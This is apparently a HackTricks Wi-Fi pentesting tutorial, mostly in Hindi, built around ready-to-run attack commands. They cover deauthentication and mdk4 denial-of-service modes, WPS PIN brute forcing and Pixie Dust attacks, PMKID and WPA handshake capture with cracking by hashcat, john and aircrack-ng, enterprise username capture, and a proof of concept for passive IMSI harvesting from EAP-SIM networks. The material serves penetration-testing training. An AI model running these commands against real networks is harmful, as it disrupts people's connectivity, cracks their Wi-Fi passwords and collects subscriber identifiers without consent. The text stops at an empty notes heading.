# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi बेसिक कमांड्स
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## उपकरण

### Hijacker & NexMon (Android के आंतरिक Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**airgeddon को docker के साथ चलाएँ**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

यह Evil Twin, KARMA, और Known Beacons attacks कर सकता है और फिर phishing template का उपयोग करके network का वास्तविक password प्राप्त करने या social network credentials capture करने में सफल हो सकता है।
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

This tool automates **WPS/WEP/WPA-PSK** attacks. It will automatically:

- इंटरफ़ेस को monitor mode में सेट करें
- संभावित नेटवर्क स्कैन करें - And let you select the victim(s)
- If **WEP** - Launch **WEP** attacks
- If **WPA-PSK**
- If **WPS**: Pixie dust attack और the bruteforce attack (be careful the brute-force attack could take a long time). Notice that it doesn't try null PIN or database/generated PINs.
- AP से **PMKID** capture करने की कोशिश करें ताकि इसे crack किया जा सके
- AP के clients को deauthenticate करने की कोशिश करें ताकि एक handshake कैप्चर हो सके
- If **PMKID** or **Handshake**, top5000 passwords का उपयोग करके bruteforce करने की कोशिश करें।

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Disconnect everyone (or a specific ESSID/Client)
- Random fake APs -- नेटवर्क छुपाएँ, संभवतः स्कैनर्स को क्रैश कर सकते हैं
- Overload AP -- AP को डाउन/किल करने की कोशिश करें (आम तौर पर ज्यादा उपयोगी नहीं)
- WIDS -- IDS के साथ खेलना
- TKIP, EAPOL -- कुछ विशिष्ट हमले जो कुछ APs को DoS कर सकते हैं
- **Cracking**
- Crack **WEP** (several tools and methods)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- captive portal creds capture करने और/या LAN attacks perform करने के लिए उपयोगी
- **WPA-PSK** Evil Twin -- पासवर्ड पता होने पर नेटवर्क अटैक्स के लिए उपयोगी
- **WPA-MGT** -- कंपनी credentials capture करने के लिए उपयोगी
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- captive portal creds capture करने और/या LAN attacks perform करने के लिए उपयोगी
- **+ WPA** -- WPA handshakes capture करने के लिए उपयोगी

## DOS

### Deauthentication Packets

**विवरण स्रोत** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, Wi-Fi hacking में एक प्रचलित तरीका, 'management' frames को फ़र्ज़ बनाकर शामिल होते हैं ताकि वे **forcefully disconnect devices from a network**. ये अनएन्क्रिप्टेड पैकेट्स क्लाइंट्स को यह विश्वास दिलाते हैं कि वे वैध नेटवर्क से हैं, जिससे attackers WPA handshakes इकट्ठा करके cracking के उद्देश्य से उपयोग कर सकते हैं या नेटवर्क कनेक्शन्स को लगातार बाधित कर सकते हैं। यह रणनीति, इसकी सादगी में खतरनाक, व्यापक रूप से उपयोग की जाती है और नेटवर्क सुरक्षा पर महत्वपूर्ण प्रभाव डालती है।

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 का मतलब deauthentication है
- 1 भेजने के लिए deauths की संख्या है (यदि चाहें तो आप कई भेज सकते हैं); 0 का अर्थ है इन्हें लगातार भेजना
- -a 00:14:6C:7E:40:80 access point का MAC address है
- -c 00:0F:B5:34:30:30 उस client का MAC address है जिसे deauthenticate किया जाना है; यदि इसे छोड़ा जाता है तो broadcast deauthentication भेजी जाती है (यह हमेशा काम नहीं करती)
- ath0 interface का नाम है

### Disassociation Packets

**Disassociation packets**, deauthentication packets की तरह, Wi-Fi नेटवर्कों में उपयोग किए जाने वाले एक प्रकार के management frame होते हैं। ये packets किसी डिवाइस (जैसे laptop या smartphone) और access point (AP) के बीच कनेक्शन को काटने का काम करते हैं। disassociation और deauthentication के बीच मुख्य अंतर उनके उपयोग के परिदृश्यों में होता है। जबकि एक AP नेटवर्क से स्पष्ट रूप से rogue devices को हटाने के लिए **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown** जारी कर सकता है, आम तौर पर disassociation packets तब भेजे जाते हैं जब AP shutdown, restart, या relocate हो रहा होता है, जिससे जुड़े हुए सभी नोड्स को disconnect करना आवश्यक हो जाता है।

**यह attack mdk4(mode "d") द्वारा किया जा सकता है:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **अधिक DOS attacks by mdk4**

**यहाँ** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

clients पर fake APs दिखाने के लिए beacon frames भेजता है। यह कभी-कभी network scanners और drivers को crash कर सकता है!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

रेंज के भीतर सभी पहुँच योग्य Access Points (APs) को authentication frames भेजने से ये APs ओवरलोड हो सकते हैं, खासकर जब कई clients शामिल हों। यह तीव्र traffic सिस्टम अस्थिरता पैदा कर सकता है, जिससे कुछ APs freeze या यहाँ तक कि reset भी हो सकते हैं।
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) यह जांचता है कि क्या SSID सही ढंग से प्रकट होता है और AP की रेंज की पुष्टि करता है। यह तकनीक, वर्डलिस्ट के साथ या बिना **bruteforcing hidden SSIDs** के साथ मिलकर, छिपे हुए नेटवर्कों की पहचान और उन तक पहुँचने में मदद करती है।

**ATTACK MODE m: Michael Countermeasures Exploitation**

विभिन्न QoS queues को रैंडम या डुप्लिकेट पैकेट भेजने से **TKIP APs** पर Michael Countermeasures ट्रिगर हो सकते हैं, जिससे AP एक मिनट के लिए बंद हो जाता है। यह तरीका एक प्रभावी **DoS** (Denial of Service) हमले की रणनीति है।
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

AP को **EAPOL Start frames** से भर देने पर **fake sessions** बन जाते हैं, जिससे AP पर दबाव बढ़ता है और वैध क्लाइंट्स ब्लॉक हो जाते हैं। वैकल्पिक रूप से, **fake EAPOL Logoff messages** इंजेक्ट करने से क्लाइंट्स जबरन डिस्कनेक्ट हो जाते हैं; दोनों तरीके नेटवर्क सेवा को प्रभावी रूप से बाधित करते हैं।
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: IEEE 802.11s mesh नेटवर्क के लिए हमले**

mesh नेटवर्क में लिंक प्रबंधन और routing पर विभिन्न प्रकार के हमले।

**ATTACK MODE w: WIDS Confusion**

क्लाइंट्स को कई WDS नोड्स या fake rogue APs से cross-connect करने से Intrusion Detection and Prevention Systems को manipulate किया जा सकता है, जिससे भ्रम और संभावित सिस्टम दुरुपयोग उत्पन्न हो सकता है।
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

A packet fuzzer जो विभिन्न packet sources और packet manipulation के लिए modifiers का व्यापक सेट प्रदान करता है।

### **Airggedon**

_**Airgeddon**_ पिछले टिप्पणियों में सुझाए गए अधिकांश attacks प्रदान करता है:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) router से devices को कनेक्ट करने की प्रक्रिया को सरल बनाता है, और **WPA** या **WPA2** Personal से encrypted नेटवर्क के लिए सेटअप की गति और सहजता बढ़ाता है। यह आसानी से compromised होने वाली WEP सुरक्षा के लिए प्रभावी नहीं है। WPS एक 8-डिजिट PIN का उपयोग करता है, जिसे दो हिस्सों में सत्यापित किया जाता है, जिससे इसकी संभावनाओं की सीमित संख्या (11,000 संभावनाएँ) के कारण इसे brute-force attacks के प्रति संवेदनशील बनाया जाता है।

### WPS Bruteforce

इस कार्रवाई के लिए मुख्य रूप से 2 tools हैं: Reaver और Bully.

- **Reaver** को WPS के खिलाफ एक मजबूत और व्यावहारिक attack के रूप में डिज़ाइन किया गया है, और इसे विभिन्न प्रकार के access points और WPS implementations पर परखा गया है।
- **Bully** WPS brute force attack का **new implementation** है, जो C में लिखा गया है। इसमें मूल reaver code की तुलना में कई फायदे हैं: कम dependencies, बेहतर memory और cpu performance, endianness का सही handling, और विकल्पों का एक अधिक robust सेट।

यह attack **WPS PIN की vulnerability** का लाभ उठाता है, खासकर पहले चार अंकों के उजागर होने और अंतिम अंक के checksum के रूप में होने के कारण, जो brute-force attack को आसान बनाता है। हालांकि, brute-force attacks के खिलाफ बचाव, जैसे आक्रामक attackers के **blocking MAC addresses**, हमले को जारी रखने के लिए **MAC address rotation** की मांग करते हैं।

Bully या Reaver जैसे tools के साथ WPS PIN प्राप्त करने पर, हमलावर WPA/WPA2 PSK निकाल सकता है, जिससे **persistent network access** सुनिश्चित होता है।
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

This refined approach targets WPS PINs using known vulnerabilities:

1. **Pre-discovered PINs**: पहले से ज्ञात PINs के डेटाबेस का उपयोग करें जो विशिष्ट निर्माताओं से जुड़े होते हैं जो समान WPS PINs उपयोग करते हैं। यह डेटाबेस MAC-addresses के पहले तीन octets को इन निर्माताओं के संभावित PINs के साथ मेल करता है।
2. **PIN Generation Algorithms**: ComputePIN और EasyBox जैसे algorithms का लाभ उठाएं, जो AP के MAC-address के आधार पर WPS PINs की गणना करते हैं। Arcadyan algorithm अतिरिक्त रूप से एक device ID की आवश्यकता रखता है, जो PIN generation प्रक्रिया में एक और परत जोड़ता है।

### WPS Pixie Dust attack

**Dominique Bongard** ने कुछ Access Points (APs) में गुप्त कोड बनाने में एक flaw खोजा, जिन्हें **nonces** (**E-S1** और **E-S2**) कहा जाता है। यदि इन nonces का पता लगा लिया जाए, तो AP के WPS PIN को crack करना आसान हो जाता है। AP PIN को एक विशेष कोड (hash) के भीतर प्रकट करता है ताकि यह प्रमाणित हो सके कि वह वैध है और नकली (rogue) AP नहीं है। ये nonces मूल रूप से उन "keys" के समान हैं जो उस "safe" को खोलते हैं जिसमें WPS PIN होता है। इस बारे में और जानकारी [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>) पर मिल सकती है।

सरल शब्दों में, समस्या यह है कि कुछ APs ने कनेक्शन प्रक्रिया के दौरान PIN को एन्क्रिप्ट करने के लिए पर्याप्त यादृच्छिक keys का उपयोग नहीं किया। इससे PIN नेटवर्क के बाहर से अनुमान लगाया जा सकता है (offline brute force attack)।
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
अगर आप डिवाइस को monitor mode में स्विच नहीं करना चाहते हैं, या `reaver` और `bully` में कोई समस्या आ रही है, तो आप [OneShot-C](https://github.com/nikita-yfh/OneShot-C) आजमा सकते हैं। यह टूल monitor mode में स्विच किए बिना Pixie Dust attack कर सकता है।
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

कुछ खराब तरीके से डिज़ाइन किए गए सिस्टम यहाँ तक कि एक **Null PIN** (एक खाली या मौजूद नहीं PIN) को प्रवेश दे देते हैं, जो काफी असामान्य है। टूल **Reaver** इस vulnerability का परीक्षण कर सकता है, जबकि **Bully** ऐसा नहीं कर पाता।
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

सभी प्रस्तावित WPS हमले आसानी से _**airgeddon.**_ का उपयोग करके किए जा सकते हैं।

![](<../../images/image (219).png>)

- 5 और 6 आपको **your custom PIN** आज़माने देते हैं (यदि आपके पास कोई है)
- 7 और 8 **Pixie Dust attack** को अंजाम देते हैं
- 13 आपको **NULL PIN** का परीक्षण करने की अनुमति देता है
- 11 और 12 **recollect the PINs related to the selected AP from available databases** और **generate** संभावित **PINs** का उपयोग करके: ComputePIN, EasyBox और वैकल्पिक रूप से Arcadyan (सिफारिश की जाती है, क्यों नहीं?)
- 9 और 10 **every possible PIN** का परीक्षण करेंगे

## **WEP**

इतना टूटा हुआ और आजकल अप्रयुक्त। बस जान लें कि _**airgeddon**_ में इस तरह की सुरक्षा पर हमला करने के लिए "All-in-One" नामक एक WEP विकल्प है। और भी टूल समान विकल्प देते हैं।

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

2018 में, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) एक नया attack method, जो खास है क्योंकि इसे केवल **one single packet** की ज़रूरत होती है और target AP से किसी भी client के connected होने की आवश्यकता नहीं होती — बस attacker और AP के बीच interaction।

कई आधुनिक राउटर association के दौरान **first EAPOL** frame में एक **optional field** जोड़ते हैं, जिसे `Robust Security Network` कहा जाता है। इसमें `PMKID` शामिल होता है।

जैसा कि मूल पोस्ट में समझाया गया है, **PMKID** ज्ञात डेटा का उपयोग करके बनाया जाता है:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
चूंकि "PMK Name" स्थिर है, और हमें AP और station का BSSID पता है, तथा `PMK` पूर्ण 4-way handshake वाले `PMK` के समान है, **hashcat** इस जानकारी का उपयोग करके PSK क्रैक कर सकता है और पासफ़्रेज़ पुनः प्राप्त कर सकता है!

इन जानकारियों को **एकत्र** करने और स्थानीय रूप से पासवर्ड पर **bruteforce** करने के लिए आप निम्न कर सकते हैं:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
ये **कैप्चर किए गए PMKIDs** **console** में दिखेंगे और साथ ही **सहेजा जाएगा** \_ **/tmp/attack.pcap**\_\
अब कैप्चर को **hashcat/john** फॉर्मेट में कनवर्ट करके क्रैक करें:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
कृपया ध्यान दें कि एक सही hash का फ़ॉर्मेट **4 भाग** होता है, जैसे: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` यदि आपका **केवल** **3 भाग** हों, तो यह **अमान्य** है (PMKID capture वैध नहीं था)।

ध्यान दें कि `hcxdumptool` **भी handshakes capture करता है** (इस तरह कुछ दिखाई देगा: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**)। आप `cap2hccapx` का उपयोग करके इन्हें **hashcat**/**john** फ़ॉर्मेट में रूपांतरित कर सकते हैं।
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool._

### Handshake कैप्चर

एक **WPA/WPA2** नेटवर्क पर हमला **handshake** कैप्चर करके और password को **offline** **crack** करने का प्रयास करके किया जा सकता है। यह प्रक्रिया किसी विशेष नेटवर्क के संचार और किसी विशिष्ट **BSSID** को एक निश्चित **channel** पर मॉनिटर करने को शामिल करती है। यहाँ एक संक्षेपित गाइड है:

1. लक्षित नेटवर्क का **BSSID**, **channel**, और एक **connected client** पहचानें।
2. `airodump-ng` का उपयोग निर्दिष्ट channel और BSSID पर नेटवर्क ट्रैफ़िक मॉनिटर करने के लिए करें, इस उम्मीद में कि आप एक handshake कैप्चर कर लें। कमांड इस तरह दिखेगा:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. हैंडशेक कैप्चर करने की संभावना बढ़ाने के लिए, क्लाइंट को अस्थायी रूप से नेटवर्क से डिसकनेक्ट करें ताकि वह re-authentication के लिए मजबूर हो। यह `aireplay-ng` कमांड का उपयोग करके किया जा सकता है, जो क्लाइंट को deauthentication packets भेजता है:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_ध्यान दें कि चूँकि client को deauthenticated किया गया था, यह किसी दूसरे AP से connect करने की कोशिश कर सकता है या, अन्य मामलों में, किसी अलग network से जुड़ सकता है._

जब `airodump-ng` में कुछ handshake जानकारी दिखाई दे, तो इसका मतलब है कि handshake कैप्चर हो चुका है और आप listening बंद कर सकते हैं:

![](<../../images/image (172) (1).png>)

एक बार handshake कैप्चर हो जाने पर आप इसे `aircrack-ng` के साथ **crack** कर सकते हैं:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### फ़ाइल में handshake है या नहीं जांचें

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_यदि यह टूल किसी ESSID का अधूरा handshake पूर्ण होने से पहले खोज लेता है, तो यह वैध handshake का पता नहीं लगाएगा._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

**एंटरप्राइज़ WiFi सेटअप में, आप विभिन्न प्रमाणीकरण विधियों से मिलेंगे**, जो अलग‑अलग सुरक्षा स्तर और प्रबंधन सुविधाएँ प्रदान करती हैं। जब आप नेटवर्क ट्रैफ़िक का निरीक्षण करने के लिए `airodump-ng` जैसे टूल का उपयोग करते हैं, तो आपको इन प्रमाणीकरण प्रकारों के पहचानकर्ता दिख सकते हैं। कुछ सामान्य विधियाँ शामिल हैं:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- यह तरीका EAP-PEAP के भीतर हार्डवेयर टोकन और वन-टाइम पासवर्ड का समर्थन करता है। MSCHAPv2 के विपरीत, यह peer challenge का उपयोग नहीं करता और access point को पासवर्ड plaintext में भेजता है, जिससे downgrade attacks का जोखिम रहता है।
2. **EAP-MD5 (Message Digest 5)**:
- क्लाइंट से पासवर्ड का MD5 hash भेजता है। यह सुझाया नहीं जाता क्योंकि यह dictionary attacks के प्रति कमजोर है, server authentication का अभाव है, और session-specific WEP keys जनरेट नहीं कर सकता।
3. **EAP-TLS (Transport Layer Security)**:
- authentication के लिए दोनों client-side और server-side certificates का उपयोग करता है और संचार को सुरक्षित करने के लिए user-based और session-based WEP keys डायनेमिकली जेनरेट कर सकता है।
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- एक encrypted tunnel के माध्यम से mutual authentication प्रदान करता है, साथ ही dynamic, per-user, per-session WEP keys व्युत्पन्न करने की विधि देता है। इसमें केवल server-side certificates की आवश्यकता होती है, जबकि क्लाइंट credentials का उपयोग करते हैं।
5. **PEAP (Protected Extensible Authentication Protocol)**:
- TLS tunnel बनाकर सुरक्षित संचार के लिए EAP की तरह काम करता है। यह tunnel के सुरक्षा होने के कारण EAP के ऊपर कमजोर authentication प्रोटोकॉल के उपयोग की अनुमति देता है।
- **PEAP-MSCHAPv2**: अक्सर PEAP के रूप में संदर्भित, यह कमजोर MSCHAPv2 challenge/response तंत्र को एक सुरक्षा TLS tunnel के साथ मिलाता है।
- **PEAP-EAP-TLS (or PEAP-TLS)**: EAP-TLS के समान है पर प्रमाणपत्रों के आदान-प्रदान से पहले TLS tunnel शुरू करता है, जो अतिरिक्त सुरक्षा स्तर प्रदान करता है।

आप इन authentication methods के बारे में और जानकारी यहाँ पा सकते हैं [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

https://tools.ietf.org/html/rfc3748#page-27 पढ़ने पर ऐसा लगता है कि यदि आप **EAP** का उपयोग कर रहे हैं तो **"Identity"** **messages** का समर्थन होना आवश्यक है, और **username** **"Response Identity"** संदेशों में **clear** में भेजा जाएगा।

यहाँ तक कि सबसे सुरक्षित authentication methods में से एक: **PEAP-EAP-TLS** का उपयोग करते समय भी, **EAP प्रोटोकॉल में भेजा गया username capture किया जा सकता है**। ऐसा करने के लिए, एक authentication communication capture करें (एक चैनल में `airodump-ng` शुरू करें और उसी इंटरफ़ेस में `wireshark`) और पैकेट्स को `eapol` से फ़िल्टर करें.\
"**Response, Identity**" पैकेट के अंदर, क्लाइंट का **username** दिखाई देगा।

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding दोनों EAP-PEAP और EAP-TTLS द्वारा समर्थित है। WiFi नेटवर्क के संदर्भ में, association प्रक्रिया के दौरान access point (AP) आमतौर पर एक EAP-Identity request शुरू करता है। उपयोगकर्ता की अनामिता की सुरक्षा सुनिश्चित करने के लिए, उपयोगकर्ता के डिवाइस पर EAP क्लाइंट का उत्तर केवल वह आवश्यक जानकारी देता है जो प्रारंभिक RADIUS सर्वर को अनुरोध संसाधित करने के लिए चाहिए। इस अवधारणा को निम्नलिखित परिदृश्यों के माध्यम से समझाया गया है:

- EAP-Identity = anonymous
- इस परिदृश्य में, सभी उपयोगकर्ता pseudonymous "anonymous" को अपने user identifier के रूप में उपयोग करते हैं। प्रारंभिक RADIUS सर्वर एक EAP-PEAP या EAP-TTLS सर्वर के रूप में कार्य करता है, जो PEAP या TTLS प्रोटोकॉल के server-side का प्रबंधन करता है। अंदरूनी (protected) authentication विधि तब स्थानीय रूप से संभाली जाती है या रिमोट (home) RADIUS सर्वर को निहित कर दी जाती है।
- EAP-Identity = anonymous@realm_x
- इस स्थिति में, विभिन्न realms के उपयोगकर्ता अपनी पहचान छुपाते हुए अपना संबंधित realm सूचित करते हैं। यह प्रारंभिक RADIUS सर्वर को EAP-PEAP या EAP-TTLS अनुरोधों को उनके home realms के RADIUS सर्वरों को proxy करने की अनुमति देता है, जो कि PEAP या TTLS सर्वर के रूप में कार्य करते हैं। प्रारंभिक RADIUS सर्वर केवल एक RADIUS relay node के रूप में संचालन करता है।
- वैकल्पिक रूप से, प्रारंभिक RADIUS सर्वर EAP-PEAP या EAP-TTLS सर्वर के रूप में कार्य कर सकता है और या तो protected authentication विधि को संभाले या इसे किसी अन्य सर्वर को आगे भेज दे। यह विकल्प विभिन्न realms के लिए अलग नीतियों को कॉन्फ़िगर करने की सुविधा देता है।

EAP-PEAP में, एक बार PEAP सर्वर और PEAP क्लाइंट के बीच TLS tunnel स्थापित होने के बाद, PEAP सर्वर एक EAP-Identity request शुरू करता है और इसे TLS tunnel के माध्यम से भेजता है। क्लाइंट इस दूसरी EAP-Identity request का जवाब TLS tunnel के माध्यम से उपयोगकर्ता की वास्तविक पहचान भेजकर देता है। यह तरीका 802.11 ट्रैफ़िक पर कोई भी eavesdropper को उपयोगकर्ता की वास्तविक पहचान उजागर होने से रोकता है।

EAP-TTLS थोड़ी अलग प्रक्रिया अपनाता है। EAP-TTLS के साथ, क्लाइंट आमतौर पर TLS tunnel से सुरक्षित PAP या CHAP का उपयोग करके authenticate करता है। इस मामले में, क्लाइंट प्रारंभिक TLS संदेश में User-Name attribute और या तो Password या CHAP-Password attribute शामिल करता है जब tunnel स्थापित हो जाता है।

कोई भी प्रोटोकॉल चुना जाए, PEAP/TTLS सर्वर TLS tunnel स्थापित होने के बाद उपयोगकर्ता की वास्तविक पहचान जान लेता है। वास्तविक पहचान user@realm के रूप में या केवल user के रूप में प्रस्तुत की जा सकती है। यदि PEAP/TTLS सर्वर उपयोगकर्ता को authenticate करने के लिए भी जिम्मेदार है, तो अब उसके पास उपयोगकर्ता की पहचान होती है और वह TLS tunnel द्वारा सुरक्षित authentication विधि के साथ आगे बढ़ता है। वैकल्पिक रूप से, PEAP/TTLS सर्वर उपयोगकर्ता के home RADIUS सर्वर को नया RADIUS अनुरोध भेज सकता है। यह नया RADIUS अनुरोध PEAP या TTLS प्रोटोकॉल लेयर को हटा देता है। उन मामलों में जहां protected authentication method EAP है, अंदरूनी EAP संदेश home RADIUS सर्वर को EAP-PEAP या EAP-TTLS wrapper के बिना भेजे जाते हैं। outgoing RADIUS संदेश का User-Name attribute उपयोगकर्ता की वास्तविक पहचान रखता है, incoming RADIUS अनुरोध से anonymous User-Name को बदलते हुए। जब protected authentication method PAP या CHAP है (केवल TTLS द्वारा समर्थित), तो TLS payload से निकाले गए User-Name और अन्य authentication attributes outgoing RADIUS संदेश में प्रतिस्थापित किए जाते हैं, incoming RADIUS अनुरोध में पाए जाने वाले anonymous User-Name और TTLS EAP-Message attributes को हटाते हुए।

अधिक जानकारी के लिए देखें [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X deployment यदि pseudonyms/protected identities या inner EAP के चारों ओर TLS tunnel लागू नहीं करता है तो unauthenticated identity phase के दौरान permanent subscriber identifier (IMSI) साफ़ पाठ में leak हो सकता है।

Where the leak happens (high level):
- 802.11 association SSID तक पूरा होता है (अक्सर carrier offload SSIDs जैसे FreeWifi_secure, eduroam-like operator realms, इत्यादि)।
- Authenticator EAP-Request/Identity भेजता है।
- Vulnerable clients अपना permanent identity = IMSI 3GPP NAI के रूप में encode करके EAP-Response/Identity में उत्तर देते हैं, किसी भी सुरक्षा के पहले।
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- कोई भी जो RF को passive रूप से सुन रहा है वह उस frame को पढ़ सकता है। किसी 4-way handshake या TLS keying की आवश्यकता नहीं है।

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>विस्तार से देखने के लिए क्लिक करें</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

नोट्स:
